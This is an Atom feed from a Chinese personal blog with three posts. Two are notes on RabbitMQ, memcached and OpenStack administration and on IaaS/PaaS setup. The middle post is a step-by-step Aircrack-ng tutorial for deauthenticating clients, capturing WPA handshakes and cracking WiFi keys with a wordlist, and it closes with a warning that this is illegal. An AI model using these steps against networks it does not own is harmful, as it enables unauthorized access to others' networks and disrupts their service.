<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>L C K</title>
  
  <subtitle>谎言是真相的倒影</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2019-01-15T10:37:55.525Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Evolto</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>iaas平台运维</title>
    <link href="http://yoursite.com/2019/01/15/iaas%E5%B9%B3%E5%8F%B0%E8%BF%90%E7%BB%B4/"/>
    <id>http://yoursite.com/2019/01/15/iaas平台运维/</id>
    <published>2019-01-15T08:33:39.000Z</published>
    <updated>2019-01-15T10:37:55.525Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><pre><code>Iaas 平台运维</code></pre><hr><h2 id="RABBIT"><a href="#RABBIT" class="headerlink" title="RABBIT"></a>RABBIT</h2><p>每一个RabbitMQ服务器都能创建虚拟消息服务器，我们称之为虚拟主机。每一个vhost本质上是一个mini版的RabbitMQ服务器，拥有自己的交换机、队列、绑定等，拥有自己的权限机制。vhost之于Rabbit就像虚拟机之于物理机一样。他们通过在各个实例间提供逻辑上分离，允许为不同的应用程序安全保密的运行数据，这很有，它既能将同一个Rabbit的众多客户区分开来，又可以避免队列和交换器的命名冲突。RabbitMQ提供了开箱即用的默认的虚拟主机“/”，如果不需要多个vhost可以直接使用这个默认的vhost，通过使用缺省的guest用户名和guest密码来访问默认的vhost。</p><h2 id="1-创建虚拟主机"><a href="#1-创建虚拟主机" class="headerlink" title="1.创建虚拟主机 "></a>1.创建虚拟主机 </h2><h2 id="rabbitmqctl-add-vhost-vhostpath"><a href="#rabbitmqctl-add-vhost-vhostpath" class="headerlink" title=" rabbitmqctl add_vhost vhostpath "></a> rabbitmqctl add_vhost vhostpath </h2><h2 id="2-删除虚拟主机"><a href="#2-删除虚拟主机" class="headerlink" title="2.删除虚拟主机 "></a>2.删除虚拟主机 </h2><h2 id="rabbitmqctl-delete-vhost-vhostpath"><a href="#rabbitmqctl-delete-vhost-vhostpath" class="headerlink" title=" rabbitmqctl delete_vhost vhostpath "></a> rabbitmqctl delete_vhost vhostpath </h2><h2 id="3-列出所有虚拟主机"><a href="#3-列出所有虚拟主机" class="headerlink" title="3.列出所有虚拟主机 "></a>3.列出所有虚拟主机 </h2><h2 id="rabbitmqctl-list-vhosts"><a href="#rabbitmqctl-list-vhosts" class="headerlink" title="rabbitmqctl list_vhosts "></a>rabbitmqctl list_vhosts </h2><p>4.列出虚拟主机上的所有权限<br>| rabbitmqctl list_permissions [-p vhostpath]</p><p>5.删除用户<br>| rabbitmqctl delete_user username </p><p>6.修改密码<br>| rabbitmqctl change_password username newpassword </p><p>7.设置用户权限   [-p vhostpath]  是指设置用户在某个虚拟机上的权限<br>| rabbitmqctl set_permissions [-p vhostpath] username regexp regexp regexp </p><p>8.清除用户权限<br>| rabbitmqctl clear_permissions [-p vhostpath] username </p><p>9.列出用户权限<br>| rabbitmqctl list_user_permissions username</p><p>10.设置用户角色 tagsName解释<br>| rabbitmqctl set_user_tags username tagsname</p><p>11.rabbitmqctl创建用户xiandianuser 密码为xiandian<br>| rabbitmqctl add_user xiandianuser xiandian</p><p>12.创建administrator角色<br>| rabbitmqctl set_user_tags xiandianuser admin</p><p>13.对xiandianuser授权<br>| rabbitmqctl set-permissions -p “/“ xiandianuser “.<em>“ “.</em> “.*”</p><p>14.查询rabbit用户<br>| rabbitmqctl list_users</p><p>15.查看xiandianuser授权信息<br>| rabbitmqctl set_permissions xiandianuser</p><h2 id="memcached"><a href="#memcached" class="headerlink" title="memcached"></a>memcached</h2><p>一般使用目的是，通过缓存数据库查询结果，减少数据库访问次数，以提高动态web应用的速度、提高可扩展性</p><p>2.修改配置文件的方式使memcache的缓存60mb 变256mb 用ps命令查询memcahce的进程信息<br>| vi /etc/sysconfig/memcached<br>|  cachesize =”256”<br>| ps -ef |grep memcacached</p><p>3.进入keystone mysql<br>| mysql -ukeystone -p000000<br>| use keystone<br>| user和local—user做联合跟新<br>| update user as u set enabled=0 where id=(select user_id from local_user as lu where name=”neutron”);</p><p>user和local联合查询<br>| select enabled from user as u where id=（local_user as lu where name=”nova”);</p><p>查询数据库的编码方式<br>| show variables like ‘character%’;</p><p>查询时间<br>| show now（）；</p><h2 id="OPENSTACK-命令"><a href="#OPENSTACK-命令" class="headerlink" title="OPENSTACK 命令"></a>OPENSTACK 命令</h2><p>创建openstack域<br>| openstack domain create –description ‘注释’ 域名名字<br>查询域名<br>| openstack domain list</p><p>创建openstack项目<br>| openstack project create –domain 域名 –description ‘注释’  项目名<br>查询项目<br>| openstack project list</p><p>创建角色<br>| create role create 角色名<br>查询角色<br>| opnestack role list</p><p>创建openstack用户<br>| openstack user create –domain 域名 –password 密码 用户名<br>| openstack user list</p><p>在域中创建一个用户密码为123456<br>| openstack user create –domain 域名 –password 123456 用户名</p><p>授权 将用户分配给项目 赐予一个权限 角色代表用户权限分为 admin user<br>| openstack role add –project 项目 –user 用户名 角色名</p><p>获取token<br>|openstack token issue </p><p>openstack命令上传image文件<br>| openstack image create “name” –file image路径 –disk-format qcow2 –container-format bare </p><p>glance命令上传image文件<br>| glance image-create –name“名字” –disk-format qcow2 –container-format bare –progress &lt;image路径 </p><h2 id="openstack命令创建云主机"><a href="#openstack命令创建云主机" class="headerlink" title="openstack命令创建云主机"></a>openstack命令创建云主机</h2><p>首先要查询到几个关键的信息才能创建云主机<br>分别是网卡.类型.镜像文件.安全组<br>首先查询网卡<br>| openstack network list<br>+———————————+———-+—————————————-+<br>| ID                                              | Name     | Subnets                         |<br>+———————————+———-+—————————————-+<br>| 36950291-172c-4daa-                 | ext-net  | 401ce5db-b282-4d14-a040-a05913a |<br>| 86c0-e0802490e50b                    |               | f8b04                           |<br>| c37b3a2b-c7c4-4682-a64b-         | int-netl | 6aaafac7-e6d2-46f4-9b27-4bb0a20 |<br>| e6d9c8c8a9a8                             |               | 0edf7                           |<br>+———————————+———-+—————————————-+<br>我们要获取的是网卡的ID</p><p>在查询类型<br>| openstack flavor list<br>+—-+———–+——-+——+———–+——-+———–+<br>| ID | Name      |   RAM | Disk | Ephemeral | VCPUs | Is Public |<br>+—-+———–+——-+——+———–+——-+———–+<br>| 1  | m1.tiny   |   512 |    1 |         0 |     1 | True      |<br>| 2  | m1.small  |  2048 |   20 |         0 |     1 | True      |<br>| 3  | m1.medium |  4096 |   40 |         0 |     2 | True      |<br>| 4  | m1.large  |  8192 |   80 |         0 |     4 | True      |<br>| 5  | m1.xlarge | 16384 |  160 |         0 |     8 | True      |<br>+—-+———–+——-+——+———–+——-+———–+<br> 类型就是云主机的内存，磁盘 和vcpus 之后选择相对应的名字下文选的m1.small</p><p>查询镜像文件<br>| openstack image list<br>+————————————–+————–+——–+<br>| ID                                   | Name         | Status |<br>+————————————–+————–+——–+<br>| daaeb6b4-ec16-4e6f-a79a-c701fc64e8ed | centos7      | active |<br>| 1b30658f-bed3-4ecf-a28f-6bbc7f5c2460 | test1        | active |<br>| f487abd0-cf79-4913-aa63-d5416a42a236 | cirros-0.3.5 | active |<br>+————————————–+————–+——–+<br>可以选择image的名字也可以选择id</p><p>查询安全组<br>| openstack security group list<br>+———————-+———+———————-+————————+<br>| ID                                | Name    | Description          | Project              |<br>+———————-+———+———————-+————————+<br>| 78281d54-8c0a-416c-  | default | Default security     | b6cf94fe31c34b339e4e |<br>| be6f-85c1d23b2356    |                | group                  | e867977cdb14             |<br>+———————-+———+———————-+————————-+<br>选择安全组的名字</p><p>接下来就是创建云主机<br>| openstack server create –image<br>镜像名字 –flavor mi.samll –nic net-id=网卡id 云主机名字<br>创建成功后使用<br>| openstack server list<br>查看云主机状态</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>kali Linux  Aircrack-ng wifi 攻击 </title>
    <link href="http://yoursite.com/2019/01/12/kali-Linux-Aircrack-ng-wifi-%E6%94%BB%E5%87%BB/"/>
    <id>http://yoursite.com/2019/01/12/kali-Linux-Aircrack-ng-wifi-攻击/</id>
    <published>2019-01-12T08:42:40.000Z</published>
    <updated>2019-01-12T09:27:12.743Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>Aircrack是一套用于破解WEP和WPA的工具套装，一般用于无线网络的密钥破解，从而非法进入未经许可的无线网络。</p><h2 id="1-进去kali系统连接终端"><a href="#1-进去kali系统连接终端" class="headerlink" title="1.进去kali系统连接终端"></a>1.进去kali系统连接终端</h2><p>KILL 掉影响网卡的进程 命令为<br>airmon-ng check kill</p><h2 id="2-开启网卡"><a href="#2-开启网卡" class="headerlink" title="2 开启网卡"></a>2 开启网卡</h2><p>airmon-ng start wlan0<br>这个时候你的网卡名由wlan0变成wlan0mon mon的意思是监控</p><h2 id="3-进行wifi网络嗅探，查看当前区域内的wifi的属性-命令为："><a href="#3-进行wifi网络嗅探，查看当前区域内的wifi的属性-命令为：" class="headerlink" title="3 进行wifi网络嗅探，查看当前区域内的wifi的属性 命令为："></a>3 进行wifi网络嗅探，查看当前区域内的wifi的属性 命令为：</h2><p>airodump-ng wlan0mon</p><h2 id="4-显示当前区域的WiFi的信息后-需要明白几个信息"><a href="#4-显示当前区域的WiFi的信息后-需要明白几个信息" class="headerlink" title="4 显示当前区域的WiFi的信息后 需要明白几个信息"></a>4 显示当前区域的WiFi的信息后 需要明白几个信息</h2><p>BSSID：wifi的Mac地址，<br>Data wifi数据大小<br>CH ：渠道<br>ESSID：wifi名称 强度降序排列</p><h2 id="5-进行对目标wifi进行抓取握手包"><a href="#5-进行对目标wifi进行抓取握手包" class="headerlink" title="5 进行对目标wifi进行抓取握手包"></a>5 进行对目标wifi进行抓取握手包</h2><p>airodump-ng -c 1 –bssid 30:24:32:6F:A7:16  -w ~/Desktop/bao/aa  wlan0mon<br> -c 为渠道   –bssid为mac地址  -w ~/Desktop/bao/aa 是方包的目录  aa是包名（自定义）</p><h2 id="6-对目标wifi进行洪水攻击，新建一个终端窗口输入："><a href="#6-对目标wifi进行洪水攻击，新建一个终端窗口输入：" class="headerlink" title="6.对目标wifi进行洪水攻击，新建一个终端窗口输入："></a>6.对目标wifi进行洪水攻击，新建一个终端窗口输入：</h2><p>aireplay-ng -0 0 -a 30:24:32:6F:A7:16  wlam0mon<br>次攻击会让目标wifi所有连接断开</p><h2 id="7-回到上一个正在抓包的窗口入出现WPA-handshake-表明只有有人重新连接wifi就可以抓到握手包"><a href="#7-回到上一个正在抓包的窗口入出现WPA-handshake-表明只有有人重新连接wifi就可以抓到握手包" class="headerlink" title="7 回到上一个正在抓包的窗口入出现WPA handshake 表明只有有人重新连接wifi就可以抓到握手包"></a>7 回到上一个正在抓包的窗口入出现WPA handshake 表明只有有人重新连接wifi就可以抓到握手包</h2><p>假设目标有人重新连接成功抓取握手包，那么我们就可以进行密码破解<br>密码破解我们需要字典 字典可以去百度上下载 也可以用kali自带的 命令如下：<br>aircrack-ng -w ~/Desktop/passwd/zidian.txt ~/Desktop/cap/aa-01.cap<br>接下来就是耐心等待 可能会失败 成功会显示 key found！{xxxxxx}<br>成功后你可能会成为板房客</p><h2 id="8-要明白的事情"><a href="#8-要明白的事情" class="headerlink" title="8.要明白的事情"></a>8.要明白的事情</h2><p>破解他人WIFI属于违法行为，涉嫌盗窃，情节严重的，有可能被追究刑事责任；<br>如果单纯的盗用信号，构成民法上的不当得利，触犯了《民法通则；如果通过路由器侵入他人系统<br>，严重的构成犯罪，如非法侵入计算机系统罪，触犯《刑法》，这是要负刑事责任的。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>iaas搭建</title>
    <link href="http://yoursite.com/2019/01/10/iaas%E6%90%AD%E5%BB%BA/"/>
    <id>http://yoursite.com/2019/01/10/iaas搭建/</id>
    <published>2019-01-10T10:19:34.000Z</published>
    <updated>2019-01-10T10:20:25.234Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>IAAS平台</p><h2 id="hostnamectl-set-hostname-controller-hostnamectl-set-hostname-compute"><a href="#hostnamectl-set-hostname-controller-hostnamectl-set-hostname-compute" class="headerlink" title="hostnamectl set-hostname controller        |         hostnamectl set-hostname compute"></a>hostnamectl set-hostname controller        |         hostnamectl set-hostname compute</h2><h2 id="编辑网卡e8-e9-e8要加GATEWAY-编辑网卡e8-e9-e8-要加GATEWAY"><a href="#编辑网卡e8-e9-e8要加GATEWAY-编辑网卡e8-e9-e8-要加GATEWAY" class="headerlink" title="编辑网卡e8 e9  e8要加GATEWAY                    |         编辑网卡e8 e9 e8 要加GATEWAY"></a>编辑网卡e8 e9  e8要加GATEWAY                    |         编辑网卡e8 e9 e8 要加GATEWAY</h2><pre><code>|            </code></pre><h2 id="setenforce-0-setenforce-0"><a href="#setenforce-0-setenforce-0" class="headerlink" title="setenforce   0                                  |   setenforce   0  "></a>setenforce   0                                  |   setenforce   0  </h2><p>vi /etc/hosts                    |  vi /etc/hosts</p><h2 id="添加-ip-和-主机名映射-添加IP-和主机名映射"><a href="#添加-ip-和-主机名映射-添加IP-和主机名映射" class="headerlink" title="添加 ip 和 主机名映射                |    添加IP 和主机名映射"></a>添加 ip 和 主机名映射                |    添加IP 和主机名映射</h2><p>传包到控制节点下的/opt<br>cd /opt<br>mkdir iaas centos7 </p><p>rm -rf /etc/yum.repos.d/<em>            |   rm -rf /etc/yum.repos/</em><br>vi　/etc/yum.repos.d/yum.repo            |   vi　/etc/yum.repos.d/yum.repo<br>控制节点的yum源路径 为 file://挂载点        |    计算节点的yum源路径为   ftp://控制节点IP</p><hr><p>[centos]<br>name=centos<br>baseurl=file:///opt/centos<br>gpgcheck=0<br>enabled=1</p><p>[iaas]<br>name=iaas<br>baseurl=file:///opt/iaas-repo<br>gpgcheck=0<br>enabled=1</p><hr><p>[centos]<br>name=centos<br>baseurl=<a href="ftp://192.168.10.10/centos/" target="_blank" rel="noopener">ftp://192.168.10.10/centos/</a><br>gpgcheck=0<br>enabled=1<br>[iaas]<br>name=iaas<br>baseurl=<a href="ftp://192.168.10.10/iaas-repo/" target="_blank" rel="noopener">ftp://192.168.10.10/iaas-repo/</a><br>gpgcheck=0<br>enabled=1</p><hr><p>控制节点yum list 成功后 装ftp<br>装完ftp 后<br>vi  /etc/vsftp/vsftpd.conf<br>在最后一行添加<br>anon_root=/opt</p><p>service vsftpd restart<br>chkconfig vsftpd on</p><hr><p>yum -y install iaas-xiandian            | yum -y install iaas-xiandian</p><p>sed ‘s/^#//g’ /etc/xiandian/openrc.sh  -i</p><p>###在计算节点分区 分swift 和cinder<br>parted  /dev/md126</p><p>print </p><p>mkpart swift endgb  size_swiftgb</p><p>mkpart cinder endgb  size_cindergb<br>q</p><p>mkfs. xfs  /dev/md126p(分区时print的结果)</p><h2 id="mkfs-xfs-dev-md126p-分区时print的结果"><a href="#mkfs-xfs-dev-md126p-分区时print的结果" class="headerlink" title="mkfs.xfs  /dev/md126p(分区时print的结果)"></a>mkfs.xfs  /dev/md126p(分区时print的结果)</h2><p>scp /etc/xiandian/o** root@compute:/etc/xiandian<br>输入计算节点密码</p><p>ping compute                                    ping controller</p><hr><p>iaas-pre-host.sh                 |  iaas-pre-host.sh</p><h2 id="reboot-reboot"><a href="#reboot-reboot" class="headerlink" title="reboot                    |   reboot"></a>reboot                    |   reboot</h2><p>注意 上面重启后再改</p><p>vi /etc/ntp.conf</p><p>在底部添加<br>server 127.127.1.0<br>fudge 127.127.1.0 stratum 10</p><p>service ntpd restart<br>chkconfig ntpd on<br>date</p><pre><code>| ntpdate controller| chkconfig ntpdate on</code></pre><hr><pre><code>|yum list</code></pre><hr><p>iaas-install-mysql.sh</p><p>iaas-install-keystone.sh</p><p>source /etc/keystone/admin-openrc.sh </p><p>openstack user list</p><p>iaas-install-glance.sh</p><p>glance image-create –name “centos7” –disk-format qcow2 –container-format bare &lt;/opt/iaas/images/c***7(不执行 复制此步骤节省时间)</p><hr><p>source /etc/keystone/admin-openrc.sh </p><h2 id="openstack-user-list"><a href="#openstack-user-list" class="headerlink" title="openstack user list"></a>openstack user list</h2><p>iaas-install-nova-controller.sh            |   iaas-install-nova-compute.sh<br>iaas-install-neutron-controller.sh        |   iaas-install-neutron-compute.sh</p><h2 id="iaas-install-neutron-controller-gre-sh-iaas-install-neutron-compute-gre-sh"><a href="#iaas-install-neutron-controller-gre-sh-iaas-install-neutron-compute-gre-sh" class="headerlink" title="iaas-install-neutron-controller-gre.sh        |   iaas-install-neutron-compute-gre.sh"></a>iaas-install-neutron-controller-gre.sh        |   iaas-install-neutron-compute-gre.sh</h2><h2 id="iaas-install-dashboard-sh"><a href="#iaas-install-dashboard-sh" class="headerlink" title="iaas-install-dashboard.sh"></a>iaas-install-dashboard.sh</h2><p>页面操作<br>输入控制节点ip/dashboard<br>创建内部网络（不共享，不勾选外部网络）<br>创建外部网络  （共享，外部网络，）<br>点击外部网络 （里面是添加的e9（第二个网卡的网段）网卡的网段的ip，要网关）</p><p>点击内部网络 （里面的ip根据考试内容或者自己定义，要网关）</p><p>添加路由<br>添加内部接口<br>添加规则 icmp udp tcp  （出入都要添加）<br>然后起云实例<br>之后的 cinder swift alarm ceilometer heat 都有脚本安装  耗时大概20分钟</p><p>起云实例给PAAS队友练习需要等待40分钟左右<br>搭建bigdata 需要1个小时左右<br>PAAS建立起来大概需要1个小时</p><p>也就是IAAS+PAAS+BIGDATA 耗时大概为3个小时左右<br>SDN耗时约为35分钟</p><p>创建云主机是 选择内网 绑定外网的浮动ip即网卡二的地址段 </p><p>iaas如果不能建立云主机  解决方法1</p><p>systemctl restart mariadb<br>openstack-service restart            |    openstack-servicer restart</p><p>PAAS/docker平台</p><p>起始环境<br>crt 至少应该连接四台机器</p><p>1 ftp源即IAAS控制节点<br>2 server  (vnc1)<br>3 client  (vnc2)<br>4 regiest (vnc3)</p><p>进入平台后<br>ftp源搭建  创建/opt/docker目录 拷贝光盘下得所有软件到此目录</p><h2 id="准备工作-需要在三台vnc上都执行"><a href="#准备工作-需要在三台vnc上都执行" class="headerlink" title="准备工作 需要在三台vnc上都执行"></a>准备工作 需要在三台vnc上都执行</h2><p>修改yum<br>rm -rfv *<br>vi yum.repo</p><p>[centos]<br>name=centos<br>baseurl=<a href="ftp://192.168.10.10/centos" target="_blank" rel="noopener">ftp://192.168.10.10/centos</a><br>gpgcheck=0<br>enabled=1<br>[docker]<br>name=docker<br>baseurl=<a href="ftp://192.168.10.10/docker/docker" target="_blank" rel="noopener">ftp://192.168.10.10/docker/docker</a><br>gpgcheck=0<br>enabled=1</p><p>iptables -F<br>iptables -X<br>iptables -Z<br>/usr/sbin/iptables-save<br>修改系统内核<br>vi /etc/sysctl.conf<br>显示内核信息<br>sysctl -p<br>yum install docker-io -y<br>修改配置文件———————————–注意REGHOST_IP就是（VNC中regiest的ip）<br>vi /etc/sysconfig/docker<br>ADD_REGISTRY=’–add-registry REGHOST_IP:5000’<br>INSECURE_REGISTRY=’–insecure-registry REGHOST_IP:5000’</p><hr>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
    
  </entry>
  
</feed>
